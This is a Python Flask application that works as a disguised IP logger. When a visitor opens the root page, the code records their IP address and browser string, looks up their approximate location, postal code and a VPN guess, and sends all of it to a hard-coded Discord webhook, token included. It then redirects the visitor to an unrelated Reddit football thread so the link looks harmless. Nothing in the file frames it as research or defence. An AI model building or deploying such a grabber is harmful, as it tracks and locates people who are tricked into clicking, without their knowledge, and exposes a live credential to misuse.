from flask import Flask, request, redirect
import requests
import json
import datetime
import os

app = Flask(__name__)

DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1427010775163080868/6Uaf91MUBd4GO3eYSf4y3i0VZkKQh0_pFQFO7H8M42IKWwYQmEkNcisypFHTmvTClpoS"

def safe_json_get(url, timeout=5):
    """Get JSON safely, return dict or empty."""
    try:
        resp = requests.get(url, timeout=timeout)
        resp.raise_for_status()
        return resp.json()
    except Exception as e:
        print(f"safe_json_get error: {e}", flush=True)
        return {}

def get_visitor_info(ip, user_agent):
    ipapi_url = f"https://ipapi.co/{ip}/json/"
    geoip_url = f"https://json.geoiplookup.io/{ip}"

    details = safe_json_get(ipapi_url)
    vpn_info = safe_json_get(geoip_url)

    vpn = "Yes" if vpn_info.get("connection_type") == "Corporate" else "No"

    now = datetime.datetime.utcnow()

    return {
        "ip": ip,
        "user_agent": user_agent,
        "vpn": vpn,
        "country": details.get("country_name", "Unknown"),
        "countryCode": details.get("country_code", "xx").lower(),
        "region": details.get("region", ""),
        "city": details.get("city", ""),
        "zip": details.get("postal", ""),
        "lat": details.get("latitude", 0),
        "lon": details.get("longitude", 0),
        "date": now.strftime("%d/%m/%Y"),
        "time": now.strftime("%H:%M:%S"),
    }

def send_to_discord(info):
    try:
        flag_url = f"https://countryflagsapi.com/png/{info['countryCode']}"
        ip_city = f"{info['ip']} ({info['city'] if info['city'] else 'Unknown City'})"
        maps_url = f"https://www.google.com/maps/search/?api=1&query={info['lat']},{info['lon']}"

        embed = {
            "username": "hexdtz",
            "avatar_url": flag_url,
            "embeds": [{
                "title": f"Visitor From {info['country']}",
                "color": 39423,
                "fields": [
                    {"name": "IP & City", "value": ip_city, "inline": True},
                    {"name": "VPN?", "value": info["vpn"], "inline": True},
                    {"name": "User Agent", "value": info["user_agent"]},
                    {"name": "Country / Code", "value": f"{info['country']}/{info['countryCode'].upper()}", "inline": True},
                    {"name": "Region | City | Zip", "value": f"[{info['region']} | {info['city']} | {info['zip']}]({maps_url})", "inline": True},
                ],
                "footer": {
                    "text": f"{info['date']} {info['time']}",
                    "icon_url": "https://e7.pngegg.com/pngimages/766/619/png-clipart-emoji-alarm-clocks-alarm-clock-time-emoticon.png"
                },
                "thumbnail": {"url": flag_url}
            }]
        }

        headers = {"Content-Type": "application/json"}
        resp = requests.post(DISCORD_WEBHOOK, headers=headers, data=json.dumps(embed), timeout=5)
        if resp.status_code != 204:
            print(f"Webhook failed: {resp.status_code} {resp.text}", flush=True)
    except Exception as e:
        print(f"Error in send_to_discord: {e}", flush=True)

@app.route('/')
def index():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip and ',' in ip:
        ip = ip.split(',')[0].strip()

    user_agent = request.headers.get('User-Agent', 'Unknown')

    info = get_visitor_info(ip, user_agent)
    send_to_discord(info)

    return redirect("https://www.reddit.com/r/football/comments/y8xqif/how_to_be_better_in_football_in_a_fast_time/")

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
